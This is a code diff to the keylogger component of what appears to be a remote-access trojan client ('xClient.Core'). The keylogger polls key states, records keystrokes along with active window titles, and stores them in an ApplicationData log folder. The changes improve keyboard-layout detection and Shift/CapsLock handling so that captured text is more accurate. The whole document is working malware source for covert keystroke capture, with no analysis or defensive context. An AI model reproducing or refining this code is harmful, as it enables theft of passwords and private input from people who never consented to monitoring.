@@ -4,6 +4,7 @@ using System.Text;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.Collections.Generic;
+using System.Globalization;
 
 namespace xClient.Core
 {
@@ -15,20 +16,21 @@ namespace xClient.Core
         [DllImport("user32.dll")]
         private static extern short GetAsyncKeyState(int vKey);
 
-        [DllImport("user32.dll")]
-        public static extern int GetWindowText(int hwnd, StringBuilder s, int nMaxCount);
-
-        [DllImport("user32.dll")]
-        public static extern int GetForegroundWindow();
+        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString,
+            int nMaxCount);
 
         [DllImport("user32.dll", CharSet = CharSet.Unicode)]
         public static extern int ToUnicodeEx(int wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
 
-        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
-        public static extern IntPtr GetKeyboardLayout(int dwLayout);
+        [DllImport("user32.dll")]
+        private static extern IntPtr GetForegroundWindow();
 
-        [DllImport("user32.dll", SetLastError = true)]
-        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
+        [DllImport("user32.dll")]
+        public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
+
+        [DllImport("user32.dll", ExactSpelling = true)]
+        internal static extern IntPtr GetKeyboardLayout(uint threadId);
 
         public bool Enabled
         {
@@ -64,6 +66,8 @@ namespace xClient.Core
         private string filePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs\\";
 
         private List<int> enumValues;
+
+        private IntPtr activeKeyboardLayout;
 
         private System.Timers.Timer timerLogKeys;
         private System.Timers.Timer timerFlush;
@@ -123,6 +127,8 @@ namespace xClient.Core
         {
             hWndTitle = GetActiveWindowTitle();
 
+            activeKeyboardLayout = GetActiveKeyboardLayout();
+
             foreach (int i in enumValues)
             {
                 if (GetAsyncKeyState(i) == -32767)
@@ -156,26 +162,32 @@ namespace xClient.Core
                             return;
                     }
 
-                    if (ShiftKey && CapsLock)
+                    if (enumValues.Contains(i))
                     {
-                        if (enumValues.Contains(i))
+                        if (ShiftKey && CapsLock)
                         {
-                            keyBuffer += FromKeys(i, false);
+                            if (i >= 65 && i <= 90)
+                                keyBuffer += FromKeys(i, false);
+                            else
+                                keyBuffer += FromKeys(i, true);
+
                             return;
                         }
-                    }
+                        else if (CapsLock)
+                        {
+                            if (i >= 65 && i <= 90)
+                                keyBuffer += FromKeys(i, true);
+                            else
+                                keyBuffer += FromKeys(i, false);
 
-                    if (ShiftKey || CapsLock)
-                    {
-                        if (enumValues.Contains(i))
+                            return;
+                        }
+                        else if (ShiftKey)
                         {
                             keyBuffer += FromKeys(i, true);
                             return;
                         }
-                    }
-                    else
-                    {
-                        if (enumValues.Contains(i))
+                        else
                         {
                             keyBuffer += FromKeys(i, false);
                             return;
@@ -227,9 +239,9 @@ namespace xClient.Core
             keyBuffer = "";
         }
 
-        public static string GetActiveWindowTitle()
+        public string GetActiveWindowTitle()
         {
-            int hwnd = GetForegroundWindow();
+            IntPtr hwnd = GetForegroundWindow();
 
             StringBuilder sbTitle = new StringBuilder(1024);
 
@@ -240,24 +252,16 @@ namespace xClient.Core
             return title != "" ? title : null;
         }
 
-        public static IntPtr GetActiveKeyboardLayout()
+        public IntPtr GetActiveKeyboardLayout()
         {
-            int hWnd = 0;
-
-            hWnd = GetForegroundWindow();
-
-            IntPtr i = new IntPtr(hWnd);
+            IntPtr hWnd = GetForegroundWindow();
 
             uint pid;
 
-            GetWindowThreadProcessId(i, out pid);
-
-            IntPtr layout = GetKeyboardLayout((int)pid);
-
-            return layout;
+            return GetKeyboardLayout(GetWindowThreadProcessId(hWnd, out pid));
         }
 
-        public static char? FromKeys(int keys, bool shift)
+        public char? FromKeys(int keys, bool shift)
         {
             var keyStates = new byte[256];
 
@@ -266,7 +270,7 @@ namespace xClient.Core
 
             var sb = new StringBuilder(10);
 
-            return ToUnicodeEx(keys, 0, keyStates, sb, sb.Capacity, 0, GetActiveKeyboardLayout()) == 1 ? (char?)sb[0] : null;
+            return ToUnicodeEx(keys, 0, keyStates, sb, sb.Capacity, 0, activeKeyboardLayout) == 1 ? (char?)sb[0] : null;
         }
     }
 }
